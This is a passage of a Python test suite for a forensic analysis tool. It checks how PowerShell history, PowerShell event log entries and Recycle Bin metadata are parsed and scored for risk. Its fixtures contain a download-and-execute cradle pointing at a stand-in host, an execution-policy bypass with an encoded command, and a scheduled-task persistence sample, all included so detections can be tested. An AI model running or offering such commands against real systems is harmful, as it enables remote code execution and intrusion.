            "parser": "powershell_jsonl",
            "powershell_artifact_type": "powershell_command",
            "source_tool": "native_powershell",
            "source_format": "jsonl",
        },
    )
    block = next(doc for doc in docs if doc["event"]["type"] == "script_block")
    assert block["artifact"]["type"] == "powershell"
    assert block["artifact"]["parser"] == "powershell_jsonl"
    assert block["execution"]["is_execution_confirmed"] is True
    assert block["execution"]["confidence"] == "high"
    assert block["powershell"]["has_iex"] is True
    assert block["powershell"]["has_download"] is True
    assert block["url"]["domain"] == "evil.example"
    assert block["download"]["url"] == "https://evil.example/a.ps1"
    assert block["download"]["target_path"] is None
    assert block["@timestamp"] == "2026-05-14T08:31:00+00:00"
    assert block["timestamp_precision"] == "event_time"


def test_evtx_powershell_4104_normalizes_as_powershell_artifact(tmp_path: Path) -> None:
    path = tmp_path / "PowerShell-EvtxECmd.csv"
    path.write_text(
        "EventID,Channel,Provider,TimeCreated,ScriptBlockText,Computer\n"
        "4104,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,2026-05-14T12:00:00Z,\"IEX (New-Object Net.WebClient).DownloadString('https://evil.example/a.ps1')\",DESKTOP-K6F8D3D\n",
        encoding="utf-8",
    )
    doc = normalize_file("case-1", "ev-1", "art-1", path, {"artifact_type": "evtx", "name": path.name, "source_path": path.name, "parser": "zimmerman"})[0]
    assert doc["artifact"]["type"] == "powershell"
    assert doc["artifact"]["parser"] == "powershell_evtx"
    assert doc["source_format"] == "evtx"
    assert doc["windows"]["event_id"] == 4104
    assert doc["event"]["type"] == "script_block"
    assert doc["execution"]["is_execution_confirmed"] is True
    assert doc["execution"]["confidence"] == "high"
    assert doc["powershell"]["artifact_type"] == "powershell_evtx"
    assert doc["powershell"]["has_iex"] is True
    assert doc["powershell"]["has_download"] is True
    assert doc["@timestamp"] == "2026-05-14T12:00:00+00:00"
    assert doc["timestamp_precision"] == "event_time"


def test_powershell_readme_is_skipped_not_indexed(tmp_path: Path) -> None:
    path = tmp_path / "README.txt"
    path.write_text("PowerShell sample fixture\n", encoding="utf-8")
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-readme",
        path,
        {
            "artifact_type": "document",
            "name": path.name,
            "source_path": str(path),
            "parser": "unsupported_text",
        },
    )
    assert docs == []


def test_build_powershell_parse_report_counts_sources_and_indicators() -> None:
    parser_audit = [
        {
            "artifact_type": "powershell",
            "parser": "powershell_history",
            "source_file": "ConsoleHost_history.txt",
            "records_read": 7,
            "records_parsed": 7,
            "records_indexed": 7,
            "encoded_command_count": 1,
            "decoded_command_count": 1,
            "download_cradle_count": 2,
            "iex_count": 1,
            "defender_tampering_count": 1,
            "persistence_count": 1,
            "by_artifact_type": {"psreadline_history": 7},
            "by_event_type": {"powershell_history": 7},
            "sample_records": [{"source_file": "ConsoleHost_history.txt", "event_type": "powershell_history"}],
        },
        {
            "artifact_type": "powershell",
            "parser": "powershell_jsonl",
            "source_file": "powershell_events_sample.jsonl",
            "records_read": 2,
            "records_parsed": 2,
            "records_indexed": 2,
            "encoded_command_count": 1,
            "decoded_command_count": 1,
            "download_cradle_count": 1,
            "iex_count": 1,
            "defender_tampering_count": 0,
            "persistence_count": 0,
            "by_artifact_type": {"powershell_command": 2},
            "by_event_type": {"script_block": 1, "command_observed": 1},
            "sample_records": [{"source_file": "powershell_events_sample.jsonl", "event_type": "script_block"}],
        },
        {
            "artifact_type": "document",
            "parser": "unsupported_text",
            "source_file": "README.txt",
            "records_read": 0,
            "records_parsed": 0,
            "records_indexed": 0,
            "parse_warnings": ["unsupported_text_skipped"],
        },
    ]
    discovery_candidates = [
        {"category": "powershell", "path": "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"},
        {"category": "powershell", "path": "C:\\Users\\alex\\Desktop\\powershell_events_sample.jsonl"},
        {"category": "evtx", "path": "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell\\Operational.evtx"},
    ]
    events = normalize_file(
        "case-1",
        "ev-1",
        "art-ps-jsonl",
        Path(__file__).parent / "fixtures" / "powershell" / "powershell_events_sample.jsonl",
        {
            "artifact_type": "powershell",
            "name": "powershell_events_sample.jsonl",
            "source_path": str(Path(__file__).parent / "fixtures" / "powershell" / "powershell_events_sample.jsonl"),
            "parser": "powershell_jsonl",
            "powershell_artifact_type": "powershell_command",
            "source_tool": "native_powershell",
            "source_format": "jsonl",
        },
    )
    report = _build_powershell_parse_report(parser_audit, discovery_candidates, events, selected_artifact_types=["powershell"], scope="evidence")
    assert report["detected_powershell_sources"] >= 2
    assert report["records_failed"] == 0
    assert report["by_parser"]["powershell_history"] == 1
    assert report["by_parser"]["powershell_jsonl"] == 1
    assert report["by_parser_events"]["powershell_history"] == 7
    assert report["by_parser_events"]["powershell_jsonl"] == 2
    assert report["by_artifact_type"]["psreadline_history"] == 7
    assert report["by_event_type"]["powershell_history"] == 7
    assert report["encoded_command_count"] >= 2
    assert report["selection_mode"] == "powershell_only"
    assert report["skipped_powershell_evtx_reason"] == "EVTX not selected; PowerShell EVTX channels were not scanned"
    assert report["evtx_files_scanned_for_powershell"] == 0


def test_build_powershell_parse_report_marks_powershell_plus_evtx_selection_and_candidates() -> None:
    parser_audit = [
        {
            "parser_name": "evtx_raw",
            "artifact_type": "evtx_raw",
            "source_file": "C%3A/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%254Operational.evtx",
            "records_read": 12,
            "records_parsed": 12,
            "records_indexed": 12,
            "parser_status": "completed",
            "channels_seen": ["Microsoft-Windows-PowerShell/Operational"],
            "event_ids_seen": ["4104"],
            "classification_counts": {"script_block": 12},
        }
    ]
    discovery_candidates = [
        {
            "category": "powershell",
            "path": "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
            "selected_for_extraction": True,
        },
        {
            "category": "evtx",
            "normalized_windows_path": "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx",
            "selected_for_extraction": True,
            "supported": True,
            "parser_status": "ready",
        },
    ]
    events = [
        {
            "artifact": {"type": "powershell", "parser": "powershell_evtx"},
            "source_tool": "native_evtx",
            "source_format": "evtx",
            "source_file": "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx",
            "event": {"type": "script_block"},
            "windows": {"event_id": 4104},
            "powershell": {"artifact_type": "powershell_evtx"},
            "data_quality": [],
            "suspicious_reasons": [],
        }
    ]
    report = _build_powershell_parse_report(
        parser_audit,
        discovery_candidates,
        events,
        selected_artifact_types=["powershell", "evtx"],
        scope="evidence",
    )
    assert report["selection_mode"] == "powershell_plus_evtx"
    assert report["powershell_evtx_sources_count"] == 1
    assert report["powershell_events_from_evtx_count"] == 12
    assert report["evtx_files_scanned_for_powershell"] == 1
    assert report["skipped_powershell_evtx_reason"] is None
    assert report["discovered_powershell_evtx_candidates"] == ["C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx"]
    assert report["selected_powershell_evtx_candidates"] == ["C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx"]
    assert report["parsed_powershell_evtx_files"][0]["original_path"] == "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx"
    assert report["parsed_powershell_evtx_files"][0]["parser_audit_source_file"] == "C%3A/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%254Operational.evtx"
    assert report["powershell_evtx_event_ids_count"]["4104"] == 1
    assert report["powershell_evtx_event_ids_seen"] == ["4104"]
    assert report["powershell_evtx_classification_counts"]["script_block"] == 12


def test_normalize_forensic_path_key_matches_selected_and_parser_audit_powershell_evtx_paths() -> None:
    selected = "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx"
    parser_audit = "C%3A/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%254Operational.evtx"
    assert _normalize_forensic_path_key(selected) == _normalize_forensic_path_key(parser_audit)


def test_build_powershell_parse_report_counts_windows_powershell_evtx_rows() -> None:
    parser_audit = [
        {
            "parser_name": "evtx_raw",
            "artifact_type": "evtx_raw",
            "source_file": "C%3A/Windows/System32/winevt/Logs/Windows PowerShell.evtx",
            "records_read": 15087,
            "records_parsed": 15087,
            "records_indexed": 15087,
            "parser_status": "completed",
            "channels_seen": ["Windows PowerShell"],
            "event_ids_seen": ["600", "400", "403", "800", "300"],
            "classification_counts": {"provider_lifecycle": 12895, "powershell_engine_lifecycle": 2174, "pipeline_execution": 4, "command_observed": 14},
        }
    ]
    discovery_candidates = [
        {
            "category": "evtx",
            "normalized_windows_path": "C:\\Windows\\System32\\winevt\\Logs\\Windows PowerShell.evtx",
            "selected_for_extraction": True,
            "supported": True,
            "parser_status": "ready",
        }
    ]
    report = _build_powershell_parse_report(
        parser_audit,
        discovery_candidates,
        [],
        selected_artifact_types=["evtx", "powershell"],
        scope="evidence",
    )
    assert report["powershell_evtx_sources_count"] == 1
    assert report["powershell_events_from_evtx_count"] == 15087
    assert report["parsed_powershell_evtx_files"][0]["original_path"] == "C:\\Windows\\System32\\winevt\\Logs\\Windows PowerShell.evtx"
    assert report["parsed_powershell_evtx_files"][0]["records_read"] == 15087
    assert report["parsed_powershell_evtx_files"][0]["channels_seen"] == ["Windows PowerShell"]
    assert report["powershell_evtx_event_ids_seen"] == ["300", "400", "403", "600", "800"]
    assert report["skipped_powershell_evtx_files"] == []


def test_build_powershell_evtx_sample_events_returns_semantic_powershell_samples() -> None:
    events = [
        {
            "source_file": "C%3A/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%254Operational.evtx",
            "artifact": {"type": "powershell", "parser": "powershell_evtx"},
            "source_format": "evtx",
            "source_tool": "native_evtx",
            "windows": {"channel": "Microsoft-Windows-PowerShell/Operational", "event_id": 4104, "provider": "Microsoft-Windows-PowerShell"},
            "event": {"type": "script_block", "action": "powershell_script_block_observed"},
            "powershell": {"command_preview": "IEX (New-Object Net.WebClient)...", "artifact_type": "powershell_evtx"},
            "execution": {"is_execution_confirmed": True, "confidence": "high"},
            "risk_score": 90,
        },
        {
            "source_file": "C%3A/Windows/System32/winevt/Logs/Windows PowerShell.evtx",
            "artifact": {"type": "powershell", "parser": "powershell_evtx"},
            "source_format": "evtx",
            "source_tool": "native_evtx",
            "windows": {"channel": "Windows PowerShell", "event_id": 600, "provider": "PowerShell"},
            "event": {"type": "provider_lifecycle", "action": "powershell_provider_lifecycle_observed"},
            "powershell": {"command_preview": None, "artifact_type": "powershell_evtx"},
            "execution": {"is_execution_confirmed": True, "confidence": "high"},
            "risk_score": 0,
        },
    ]
    sample = _build_powershell_evtx_sample_events(events)
    assert sample
    assert sample[0]["artifact"]["type"] == "powershell"
    assert sample[0]["artifact"]["parser"] == "powershell_evtx"


def test_build_powershell_evtx_sample_events_includes_windows_event_with_semantic_warning() -> None:
    events = [
        {
            "id": "evt-1",
            "source_file": "C%3A/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%254Operational.evtx",
            "artifact": {"type": "windows_event", "parser": "evtx_raw"},
            "source_format": "evtx",
            "source_tool": "native_evtx",
            "windows": {"channel": "Microsoft-Windows-PowerShell/Operational", "event_id": 4104, "provider": "Microsoft-Windows-PowerShell"},
            "event": {"type": "script_block", "action": "powershell_script_block_observed", "category": "execution", "timeline_include": True, "message": "script block"},
            "powershell": {"artifact_type": "powershell_evtx", "command_preview": "IEX (...)", "has_iex": True, "has_download": True, "urls": ["https://evil.example/a.ps1"], "domains": ["evil.example"], "paths": []},
            "execution": {"source": "powershell", "is_execution_confirmed": True, "confidence": "high"},
            "risk_score": 90,
            "suspicious_reasons": ["PowerShell Invoke-Expression"],
            "data_quality": [],
        }
    ]
    sample = _build_powershell_evtx_sample_events(events)
    assert len(sample) == 1
    assert sample[0]["semantic_normalization_warning"] == "expected artifact.type=powershell parser=powershell_evtx"


def test_build_powershell_evtx_sample_events_empty_when_no_powershell_evtx_candidates() -> None:
    events = [
        {
            "id": "evt-1",
            "artifact": {"type": "service", "parser": "windows_service_registry"},
            "source_format": "registry_hive",
            "windows": {"channel": None, "event_id": None, "provider": None},
        }
    ]
    assert _build_powershell_evtx_sample_events(events) == []


def test_powershell_psreadline_benign_commands_do_not_become_suspicious(tmp_path: Path) -> None:
    path = tmp_path / "ConsoleHost_history.txt"
    path.write_text(
        "\n".join(
            [
                "Get-Process",
                "Get-Service WinDefend",
                "cd ..",
                "ls",
                "wsl --install",
                "winget install Microsoft.WinDbg",
            ]
        ),
        encoding="utf-8",
    )
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-ps-benign",
        path,
        {
            "artifact_type": "powershell",
            "name": path.name,
            "source_path": str(path),
            "parser": "powershell_history",
            "powershell_artifact_type": "psreadline_history",
            "source_tool": "psreadline_history",
            "source_format": "txt",
        },
    )
    assert len(docs) == 6
    for doc in docs:
        assert doc["artifact"]["type"] == "powershell"
        assert doc["event"]["type"] == "powershell_history"
        assert doc["risk_score"] <= 10
        assert doc["suspicious_reasons"] == []
        assert "suspicious_process" not in set(doc["tags"])
        assert doc["event"]["timeline_include"] is False
        assert doc["execution"]["is_execution_confirmed"] is False
        assert "powershell_history_not_execution_proof" in doc["data_quality"]


def test_powershell_psreadline_set_execution_policy_unrestricted_is_flagged(tmp_path: Path) -> None:
    path = tmp_path / "ConsoleHost_history.txt"
    path.write_text("Set-ExecutionPolicy Unrestricted\n", encoding="utf-8")
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-ps-policy",
        path,
        {
            "artifact_type": "powershell",
            "name": path.name,
            "source_path": str(path),
            "parser": "powershell_history",
            "powershell_artifact_type": "psreadline_history",
            "source_tool": "psreadline_history",
            "source_format": "txt",
        },
    )
    assert len(docs) == 1
    doc = docs[0]
    assert doc["powershell"]["has_execution_policy_bypass"] is True
    assert "PowerShell execution policy weakened" in doc["suspicious_reasons"]
    assert 30 <= doc["risk_score"] <= 40
    assert doc["execution"]["is_execution_confirmed"] is False


def test_powershell_semi_auto_sections_and_correlation(monkeypatch) -> None:
    history_path = Path(__file__).parent / "fixtures" / "powershell" / "ConsoleHost_history.txt"
    ps_docs = normalize_file(
        "case-1",
        "ev-1",
        "art-ps",
        history_path,
        {
            "artifact_type": "powershell",
            "name": history_path.name,
            "source_path": str(history_path),
            "parser": "psreadline",
            "powershell_artifact_type": "psreadline_history",
            "source_tool": "psreadline_history",
            "source_format": "txt",
        },
    )
    browser_path = Path(__file__).parent / "fixtures" / "browser_downloads_sample.csv"
    browser_docs = normalize_file("case-1", "ev-1", "art-browser", browser_path, {"artifact_type": "browser", "name": browser_path.name, "source_path": str(browser_path), "parser": "browserhistoryview"})
    evtx_event = {
        "id": "evtx-ps-1",
        "event_id": "evtx-ps-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-evtx",
        "@timestamp": "2026-05-10T08:10:00+00:00",
        "event": {"category": "execution", "type": "program_execution", "severity": "high", "message": "Process created: powershell.exe"},
        "process": {"name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command_line": "powershell.exe -NoP -ExecutionPolicy Bypass -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=="},
        "artifact": {"type": "evtx", "name": "Security-EvtxECmd.csv"},
        "tags": ["powershell"],
        "suspicious_reasons": [],
    }
    defender_event = {
        "id": "def-ps-1",
        "event_id": "def-ps-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-def",
        "@timestamp": "2026-05-10T08:11:00+00:00",
        "event": {"category": "detection", "type": "defender_detection", "severity": "high", "message": "Threat detected"},
        "detection": {"path": "C:\\Users\\alex\\Downloads\\payload.exe", "threat_name": "Trojan:Win32/Test"},
        "artifact": {"type": "defender", "name": "DetectionHistory"},
        "tags": ["defender", "detection"],
        "suspicious_reasons": [],
    }
    task_event = {
        "id": "task-ps-1",
        "event_id": "task-ps-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-task",
        "@timestamp": "2026-05-10T08:12:00+00:00",
        "event": {"category": "persistence", "type": "scheduled_task_definition", "severity": "medium", "message": "Task observed"},
        "task": {"name": "Update", "path": "\\Update", "command": "powershell.exe", "arguments": "-File C:\\Users\\alex\\AppData\\Local\\Temp\\runme.ps1", "enabled": True, "hidden": False},
        "artifact": {"type": "scheduled_task", "name": "task.xml"},
        "tags": ["scheduled_task", "persistence"],
        "suspicious_reasons": [],
    }
    events = [*browser_docs, *ps_docs, evtx_event, defender_event, task_event]
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter(events))
    result = build_case_semi_auto_analysis("case-1")
    assert result["sections"]["powershell_activity"]
    assert result["sections"]["powershell_downloads"]
    assert result["sections"]["powershell_encoded_commands"]
    assert result["sections"]["powershell_defender_tampering"]
    assert result["sections"]["powershell_persistence"]
    assert any(item["activity_type"] in {"powershell_download", "downloaded_and_executed_via_powershell"} for item in result["sections"]["powershell_downloads"])


def test_artifact_classification_rbcmd_csv() -> None:
    result = classify_artifact(Path("RBCmd_Output.csv"), ["DeletedOn", "OriginalFileName", "OriginalPath", "FileSize", "SID"])
    assert result["artifact_type"] == "recycle_bin"
    assert result["parser"] == "rbcmd"


def test_velociraptor_discovery_detects_recycle_bin_artifacts(tmp_path: Path) -> None:
    source_root = Path(__file__).parent / "fixtures" / "recycle_bin" / "velociraptor_collection_recycle"
    for source in source_root.rglob("*"):
        if source.is_dir():
            continue
        target = tmp_path / source.relative_to(source_root)
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(source.read_bytes())
    discovery = discover_velociraptor_evidences(tmp_path)
    recycle_candidates = [candidate for candidate in discovery.candidates if candidate.category == "recycle_bin"]
    assert recycle_candidates
    pair = next(item for item in recycle_candidates if item.artifact_type == "recycle_pair")
    assert pair.supported is True
    assert pair.parser_status == "ready"
    assert pair.sid == "S-1-5-21-111-222-333-1001"
    assert pair.original_i_path
    assert pair.original_r_path
    assert pair.normalized_windows_i_path == "C:\\$Recycle.Bin\\S-1-5-21-111-222-333-1001\\$IABC123.exe"


def test_velociraptor_discovery_detects_recycle_bin_orphans(tmp_path: Path) -> None:
    orphan_root = tmp_path / "uploads" / "auto" / "C%3A" / "$Recycle.Bin" / "S-1-5-21-111-222-333-1001"
    orphan_root.mkdir(parents=True)
    (orphan_root / "$IWITHOUTR.ps1").write_bytes(b"placeholder")
    (orphan_root / "$RORPHAN.exe").write_bytes(b"placeholder")
    discovery = discover_velociraptor_evidences(tmp_path)
    orphan_i = next(item for item in discovery.candidates if item.artifact_type == "recycle_i_file")
    orphan_r = next(item for item in discovery.candidates if item.artifact_type == "recycle_r_file")
    assert orphan_i.sid == "S-1-5-21-111-222-333-1001"
    assert orphan_i.supported is True
    assert orphan_r.supported is True
    assert orphan_r.parser_status == "partial"


def test_recycle_raw_i_file_normalization() -> None:
    path = Path(__file__).parent / "fixtures" / "recycle_bin" / "generated_I.bin"
    deleted_at = datetime(2026, 5, 10, 8, 0, tzinfo=UTC)
    raw = _build_recycle_i_bytes("C:\\Users\\alex\\Downloads\\invoice.pdf.exe", deleted_at=deleted_at, size=1337)
    try:
        path.write_bytes(raw)
        docs = normalize_file(
            "case-1",
            "ev-1",
            "art-recycle",
            path,
            {
                "artifact_type": "recycle_bin",
                "name": "$IABC123.exe",
                "source_path": "C:\\$Recycle.Bin\\S-1-5-21-111-222-333-1001\\$IABC123.exe",
                "parser": "raw_i_file",
                "recycle_artifact_type": "recycle_i_file",
                "recycle_r_path": "C:\\$Recycle.Bin\\S-1-5-21-111-222-333-1001\\$RABC123.exe",
                "source_tool": "recycle_bin_raw",
                "source_format": "raw",
            },
        )
    finally:
        if path.exists():
            path.unlink()
    doc = docs[0]
    assert doc["event"]["type"] == "file_deleted"
    assert doc["event"]["action"] == "recycle_bin_deleted"
    assert doc["recycle"]["original_path"] == "C:\\Users\\alex\\Downloads\\invoice.pdf.exe"
    assert doc["recycle"]["original_file_name"] == "invoice.pdf.exe"
    assert doc["recycle"]["original_size"] == 1337
    assert doc["recycle"]["sid"] == "S-1-5-21-111-222-333-1001"
    assert doc["recycle"]["has_r_file"] is True
    assert doc["recycle"]["content_status"] == "present"
    assert doc["file"]["extension"] == ".exe"
    assert "Deleted executable found in Recycle Bin" in doc["suspicious_reasons"]
    assert "Deleted file from Downloads" in doc["suspicious_reasons"]
    assert doc["artifact"]["parser"] == "recycle_bin_raw"
    assert doc["velociraptor"]["original_path"] == "C:\\$Recycle.Bin\\S-1-5-21-111-222-333-1001\\$IABC123.exe"
    assert doc["velociraptor"]["artifact_category"] == "recycle_bin"
    assert doc["velociraptor"]["parser_status"] == "parsed"


def test_recycle_raw_i_file_tolerates_corruption() -> None:
    path = Path(__file__).parent / "fixtures" / "recycle_bin" / "corrupt_I.bin"
    try:
        path.write_bytes(b"\x01\x02\x03")
        docs = normalize_file(
            "case-1",
            "ev-1",
            "art-recycle",
            path,
            {
                "artifact_type": "recycle_bin",
                "name": "$ICORRUPT.ps1",
                "source_path": "C:\\$Recycle.Bin\\S-1-5-21-111-222-333-1001\\$ICORRUPT.ps1",
                "parser": "raw_i_file",
                "recycle_artifact_type": "recycle_i_file",
                "source_tool": "recycle_bin_raw",
                "source_format": "raw",
            },
        )
    finally:
        if path.exists():
            path.unlink()
    assert docs
    assert docs[0]["event"]["type"] == "recycle_metadata_observed"
    assert docs[0]["recycle"]["original_path"] is None
    assert "invalid_recycle_original_path" in docs[0]["data_quality"]
    assert docs[0]["raw_summary"]


def test_recycle_raw_i_file_v2_length_field_path_is_parsed() -> None:
    path = Path(__file__).parent / "fixtures" / "recycle_bin" / "generated_I_v2.bin"
    deleted_at = datetime(2025, 9, 9, 13, 57, 13, 97000, tzinfo=UTC)
    original = "C:\\Users\\dfir\\Downloads\\test.log"
    raw = _build_recycle_i_bytes(original, deleted_at=deleted_at, size=325396, version=2, include_length_field=True)
    try:
        path.write_bytes(raw)
        docs = normalize_file(
            "case-1",
            "ev-1",
            "art-recycle",
            path,
            {
                "artifact_type": "recycle_bin",
                "name": "$IFT1LDM.log",
                "source_path": "C:\\$Recycle.Bin\\S-1-5-21-3728220127-4279480426-1791368715-1002\\$IFT1LDM.log",
                "parser": "raw_i_file",
                "recycle_artifact_type": "recycle_i_file",
                "recycle_r_path": "C:\\$Recycle.Bin\\S-1-5-21-3728220127-4279480426-1791368715-1002\\$RFT1LDM.log",
                "source_tool": "recycle_bin_raw",
                "source_format": "raw",
            },
        )
    finally:
        if path.exists():
            path.unlink()
    doc = docs[0]
    assert doc["file"]["path"] == original
    assert doc["file"]["name"] == "test.log"
    assert doc["file"]["extension"] == ".log"
    assert doc["recycle"]["original_path"] == original
    assert doc["recycle"]["original_file_name"] == "test.log"
    assert doc["recycle"]["pair_id"] == "FT1LDM.log"


def test_recycle_raw_i_file_utf16_fallback_avoids_numeric_path() -> None:
    path = Path(__file__).parent / "fixtures" / "recycle_bin" / "generated_I_fallback.bin"
    deleted_at = datetime(2025, 9, 9, 13, 57, 13, 97000, tzinfo=UTC)
    original = "C:\\Users\\dfir\\Downloads\\FT1LDM.log"
    payload = bytearray()
    payload += int(2).to_bytes(8, "little", signed=False)
    payload += int(325396).to_bytes(8, "little", signed=False)
    payload += _filetime_bytes(deleted_at)
    payload += int(5).to_bytes(4, "little", signed=False)
    payload += b"\xff\xff\xff\xff"
    payload += original.encode("utf-16le") + b"\x00\x00"
    try:
        path.write_bytes(bytes(payload))
        docs = normalize_file(
            "case-1",
            "ev-1",
            "art-recycle",
            path,
            {
                "artifact_type": "recycle_bin",
                "name": "$IFT1LDM.log",
                "source_path": "C:\\$Recycle.Bin\\S-1-5-21-3728220127-4279480426-1791368715-1002\\$IFT1LDM.log",
                "parser": "raw_i_file",
                "recycle_artifact_type": "recycle_i_file",
                "source_tool": "recycle_bin_raw",
                "source_format": "raw",
            },
        )
    finally:
        if path.exists():
            path.unlink()
    doc = docs[0]
    assert doc["recycle"]["original_path"] == original
    assert doc["file"]["path"] != "5"
    assert "original_path_extracted_by_utf16_fallback" in str((doc["raw"] or {}).get("ParseWarnings") or "")


def test_recycle_raw_i_file_invalid_path_does_not_index_numeric_path() -> None:
    path = Path(__file__).parent / "fixtures" / "recycle_bin" / "generated_I_invalid.bin"
    deleted_at = datetime(2025, 9, 9, 13, 57, 13, 97000, tzinfo=UTC)
    payload = bytearray()
    payload += int(2).to_bytes(8, "little", signed=False)
    payload += int(325396).to_bytes(8, "little", signed=False)
    payload += _filetime_bytes(deleted_at)
    payload += int(1).to_bytes(4, "little", signed=False)
    payload += "5".encode("utf-16le") + b"\x00\x00"
    try:
        path.write_bytes(bytes(payload))
        docs = normalize_file(
            "case-1",
            "ev-1",
            "art-recycle",
            path,
            {
                "artifact_type": "recycle_bin",
                "name": "$IBAD.txt",
                "source_path": "C:\\$Recycle.Bin\\S-1-5-21-3728220127-4279480426-1791368715-1002\\$IBAD.txt",
                "parser": "raw_i_file",
                "recycle_artifact_type": "recycle_i_file",
                "source_tool": "recycle_bin_raw",
                "source_format": "raw",
            },
        )
    finally:
        if path.exists():
            path.unlink()
    doc = docs[0]
    assert doc["file"]["path"] is None
    assert doc["recycle"]["original_path"] is None
    assert "invalid_recycle_original_path" in doc["data_quality"]
    assert doc["event"]["message"] == "Recycle Bin metadata observed but original path could not be parsed"


def test_recycle_rbcmd_csv_normalization_fixture() -> None:
    path = Path(__file__).parent / "fixtures" / "recycle_bin" / "rbcmd_sample.csv"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-recycle",
        path,
        {
            "artifact_type": "recycle_bin",
            "name": path.name,
            "source_path": str(path),
            "parser": "rbcmd",
            "recycle_artifact_type": "recycle_bin_csv",
            "source_tool": "rbcmd",
            "source_format": "csv",
        },
    )
    exe_doc = next(doc for doc in docs if doc["file"]["name"] == "invoice.pdf.exe")
    ps1_doc = next(doc for doc in docs if doc["file"]["name"] == "runme.ps1")
    missing_doc = next(doc for doc in docs if doc["raw"].get("OriginalPath") == "")
    assert exe_doc["recycle"]["original_path"] == "C:\\Users\\alex\\Downloads\\invoice.pdf.exe"
    assert exe_doc["recycle"]["sid"] == "S-1-5-21-111-222-333-1001"
    assert exe_doc["file"]["size"] == 4096
    assert "double_extension" in exe_doc["tags"]
    assert "deleted_download" in exe_doc["tags"]
    assert "script_deleted" in ps1_doc["tags"]
    assert missing_doc["file"]["path"] is None


def test_recycle_parse_report_counts_deleted_and_incomplete_pairs() -> None:
    parser_audit = [
        {
            "artifact_type": "recycle_bin",
            "parser_name": "recycle_bin_csv",
            "records_read": 2,
            "records_parsed": 2,
            "records_indexed": 2,
            "source_file": "rbcmd_sample.csv",
        }
    ]
    events = [
        {
            "id": "rb-1",
            "artifact": {"type": "recycle_bin", "parser": "recycle_bin_csv", "source_path": "rbcmd_sample.csv"},
            "event": {"type": "file_deleted"},
            "recycle": {"source_file": "rbcmd_sample.csv", "drive_letter": "C:"},
            "file": {"extension": ".exe"},
            "user": {"name": "dfir", "sid": "S-1-5-21-test"},
            "volume": {"drive_letter": "C:"},
            "data_quality": [],
            "suspicious_reasons": [
                "Deleted executable found in Recycle Bin",
                "Deleted file from Downloads",
            ],
        },
        {
            "id": "rb-2",
            "artifact": {"type": "recycle_bin", "parser": "recycle_bin_raw", "source_path": "generated_I.bin"},
            "event": {"type": "recycle_metadata_observed"},
            "recycle": {"source_file": "generated_I.bin", "drive_letter": "C:"},
            "file": {"extension": ".ps1"},
            "user": {"name": None, "sid": "S-1-5-21-test"},
            "volume": {"drive_letter": "C:"},
            "data_quality": ["recycle_pair_incomplete", "missing_recovery_file"],
            "suspicious_reasons": [
                "Deleted script found in Recycle Bin",
                "Recycle Bin pair missing $R content",
            ],
        },
    ]
    report = _build_recycle_parse_report(parser_audit, [], events, selected_artifact_types=["recycle_bin"], scope="evidence")
    assert report["records_indexed"] == 2
    assert report["deleted_count"] == 1
    assert report["missing_r_file_count"] == 1
    assert report["incomplete_pair_count"] == 1
    assert report["by_extension"][".exe"] == 1
    assert report["by_extension"][".ps1"] == 1
    assert sum(report["by_event_type"].values()) == 2


def test_recycle_sample_events_prefers_suspicious_and_incomplete_pairs() -> None:
    events = [
        {
            "id": "rb-1",
            "artifact": {"type": "recycle_bin"},
            "event": {"type": "file_deleted"},
            "suspicious_reasons": ["Deleted executable found in Recycle Bin"],
            "data_quality": [],
        },
        {
            "id": "rb-2",
            "artifact": {"type": "recycle_bin"},
            "event": {"type": "recycle_metadata_observed"},
            "suspicious_reasons": [],
            "data_quality": ["recycle_pair_incomplete"],
        },
    ]
    sample = _build_recycle_sample_events(events)
    assert len(sample) == 2
    assert sample[0]["id"] == "rb-1"
    assert sample[1]["id"] == "rb-2"


def test_artifact_classification_recycle_jsonl() -> None:
    result = classify_artifact(
        Path("recycle_payload_exe.jsonl"),
        ["ArtifactType", "SID", "User", "OriginalPath", "DeletedTime", "IFilePath", "RFilePath"],
    )
    assert result["artifact_type"] == "recycle_bin"
    assert result["parser"] == "jsonl"


def test_recycle_jsonl_normalization_produces_deleted_event(tmp_path: Path) -> None:
    path = tmp_path / "recycle_payload_exe.jsonl"
    path.write_text(
        json.dumps(
            {
                "ArtifactType": "recycle_bin",
                "SID": "S-1-5-21-111-222-333-1001",
                "User": "dfir",
                "OriginalPath": "C:\\Users\\dfir\\Downloads\\payload.exe",
                "DeletedTime": "2026-05-15T11:00:00Z",
                "IFilePath": "C:\\$Recycle.Bin\\S-1-5-21-111-222-333-1001\\$IPAYLOAD.exe",
                "RFilePath": "C:\\$Recycle.Bin\\S-1-5-21-111-222-333-1001\\$RPAYLOAD.exe",
                "HasIFile": True,
                "HasRFile": True,
            }
        )
